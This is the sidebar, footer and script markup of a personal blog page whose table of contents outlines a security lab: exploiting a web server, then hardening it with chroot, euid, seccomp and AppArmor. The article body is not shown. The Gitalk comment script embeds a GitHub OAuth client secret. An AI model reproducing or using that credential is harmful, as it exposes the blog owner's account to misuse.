id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://pica.zhimg.com/80/v2-b6830c2136b7784c0aba649af7ec2867_1440w.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Xiang Li</div><div class="author-info-description">Xiang Li's Blog</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XLOverflow"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Talk is cheap. Show me the code.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#information-system-security-lab2-record"><span class="toc-number">1.</span> <span class="toc-text">Information System
+Security Lab2 Record</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit-vulnerable-processes-of-web-server-to-obtain-shell-or-delete-root-privilege-file-tmptest"><span class="toc-number">1.1.</span> <span class="toc-text">Exploit
+vulnerable processes of web server to obtain shell (or delete root
+privilege file &#x2F;tmp&#x2F;test)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#experiment-environment-configuration"><span class="toc-number">1.1.1.</span> <span class="toc-text">Experiment Environment
+Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perform-exploit-attack"><span class="toc-number">1.1.2.</span> <span class="toc-text">Perform exploit attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#problems-encountered"><span class="toc-number">1.1.3.</span> <span class="toc-text">Problems Encountered</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#use-chroot-to-constrain-web-server-perform-exploit-delete-root-privilege-file-tmptest"><span class="toc-number">1.2.</span> <span class="toc-text">Use
+chroot to constrain web server, perform exploit, delete root privilege
+file &#x2F;tmp&#x2F;test</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#experiment-environment-configuration-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Experiment Environment
+Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perform-chroot-configuration"><span class="toc-number">1.2.2.</span> <span class="toc-text">Perform chroot configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perform-exploit-test"><span class="toc-number">1.2.3.</span> <span class="toc-text">Perform exploit test</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete-tmptest.txt-file"><span class="toc-number">1.2.4.</span> <span class="toc-text">Delete &#x2F;tmp&#x2F;test.txt file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#defense-result-analysis"><span class="toc-number">1.2.5.</span> <span class="toc-text">Defense Result Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#change-process-euid-test-exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Change process euid, test
+exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#experiment-environment-configuration-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Experiment Environment
+Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perform-euid-configuration"><span class="toc-number">1.3.2.</span> <span class="toc-text">Perform euid configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perform-exploit-test-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">Perform exploit test</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#defense-result-analysis-1"><span class="toc-number">1.3.4.</span> <span class="toc-text">Defense Result Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#use-seccomp-to-constrain-web-servers-vulnerable-process-test-exploit"><span class="toc-number">1.4.</span> <span class="toc-text">Use
+seccomp to constrain web server’s vulnerable process, test exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#experiment-environment-configuration-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">Experiment Environment
+Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perform-seccomp-coding"><span class="toc-number">1.4.2.</span> <span class="toc-text">Perform seccomp coding</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#default-allow-explicit-deny"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">Default allow, explicit deny</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#default-deny-explicit-allow"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">Default deny, explicit allow</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perform-exploit-test-2"><span class="toc-number">1.4.3.</span> <span class="toc-text">Perform exploit test</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#default-allow-explicit-deny-1"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">Default allow, explicit deny</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#default-deny-explicit-allow-1"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">Default deny, explicit allow</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#defense-result-analysis-2"><span class="toc-number">1.4.4.</span> <span class="toc-text">Defense Result Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#use-apparmor-to-constrain-web-servers-vulnerable-process-test-exploit"><span class="toc-number">1.5.</span> <span class="toc-text">Use
+AppArmor to constrain web server’s vulnerable process, test exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#experiment-environment-configuration-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">Experiment Environment
+Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apply-apparmor"><span class="toc-number">1.5.2.</span> <span class="toc-text">Apply AppArmor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perform-exploit-test-3"><span class="toc-number">1.5.3.</span> <span class="toc-text">Perform exploit test</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#problems-encountered-1"><span class="toc-number">1.5.4.</span> <span class="toc-text">Problems Encountered</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#defense-result-analysis-3"><span class="toc-number">1.5.5.</span> <span class="toc-text">Defense Result Analysis</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/14/11711-Advanced-NLP/11711-Advanced-NLP-Retrieval-RAG/" title="11711 Advanced NLP: Retrieval and RAG"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="11711 Advanced NLP: Retrieval and RAG"/></a><div class="content"><a class="title" href="/2026/02/14/11711-Advanced-NLP/11711-Advanced-NLP-Retrieval-RAG/" title="11711 Advanced NLP: Retrieval and RAG">11711 Advanced NLP: Retrieval and RAG</a><time datetime="2026-02-14T22:08:21.000Z" title="Created 2026-02-14 17:08:21">2026-02-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/13/15642-Machine-Learning-Systems/15642-ML-Systems-Distributed-Training-and-Parallelization/" title="15642 Machine Learning Systems: Distributed Training and Parallelization"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260122210733236.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="15642 Machine Learning Systems: Distributed Training and Parallelization"/></a><div class="content"><a class="title" href="/2026/02/13/15642-Machine-Learning-Systems/15642-ML-Systems-Distributed-Training-and-Parallelization/" title="15642 Machine Learning Systems: Distributed Training and Parallelization">15642 Machine Learning Systems: Distributed Training and Parallelization</a><time datetime="2026-02-13T21:00:00.000Z" title="Created 2026-02-13 16:00:00">2026-02-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/13/11868-LLM-Sys/11868-LLM-Sys-Decoding/" title="11868 LLM Sys: Decoding"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="11868 LLM Sys: Decoding"/></a><div class="content"><a class="title" href="/2026/02/13/11868-LLM-Sys/11868-LLM-Sys-Decoding/" title="11868 LLM Sys: Decoding">11868 LLM Sys: Decoding</a><time datetime="2026-02-13T01:00:00.000Z" title="Created 2026-02-12 20:00:00">2026-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/12/11868-LLM-Sys/11868-LLM-Sys-Tokenization-and-Embedding/" title="11868 LLM Sys: Tokenization and Embedding"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="11868 LLM Sys: Tokenization and Embedding"/></a><div class="content"><a class="title" href="/2026/02/12/11868-LLM-Sys/11868-LLM-Sys-Tokenization-and-Embedding/" title="11868 LLM Sys: Tokenization and Embedding">11868 LLM Sys: Tokenization and Embedding</a><time datetime="2026-02-12T20:30:00.000Z" title="Created 2026-02-12 15:30:00">2026-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/09/15642-Machine-Learning-Systems/15642-ML-Systems-Transformer-Attention-Optimizations/" title="15642 Machine Learning Systems: Transformer, Attention, and Optimizations"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260122210733236.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="15642 Machine Learning Systems: Transformer, Attention, and Optimizations"/></a><div class="content"><a class="title" href="/2026/02/09/15642-Machine-Learning-Systems/15642-ML-Systems-Transformer-Attention-Optimizations/" title="15642 Machine Learning Systems: Transformer, Attention, and Optimizations">15642 Machine Learning Systems: Transformer, Attention, and Optimizations</a><time datetime="2026-02-09T19:30:00.000Z" title="Created 2026-02-09 14:30:00">2026-02-09</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Xiang Li</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const commentCount = n => {
+    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+    if (isCommentCount) {
+      isCommentCount.textContent= n
+    }
+  }
+
+  const initGitalk = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGitalk = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const gitalk = new Gitalk({
+      clientID: 'fb37ffde539166b338d8',
+      clientSecret: '00c01014243d312219aa68b6a2e22f7f19f4c8ef',
+      repo: 'blog-comments',
+      owner: 'XLOverflow',
+      admin: ['XLOverflow'],
+      updateCountCallback: commentCount,
+      ...option,
+      id: isShuoshuo ? path : (option && option.id) || '92eb7bf0522095df21764f8ebbb0d23c'
+    })
+
+    gitalk.render('gitalk-container')
+  }
+
+  const loadGitalk = async(el, path) => {
+    if (typeof Gitalk === 'function') initGitalk(el, path)
+    else {
+      await btf.getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+      await btf.getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
+      initGitalk(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Gitalk' === 'Gitalk'
+      ? window.shuoshuoComment = { loadComment: loadGitalk }
+      : window.loadOtherComment = loadGitalk
+    return
+  }
+
+  if ('Gitalk' === 'Gitalk' || !true) {
+    if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+    else loadGitalk()
+  } else {
+    window.loadOtherComment = loadGitalk
+  }
+})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
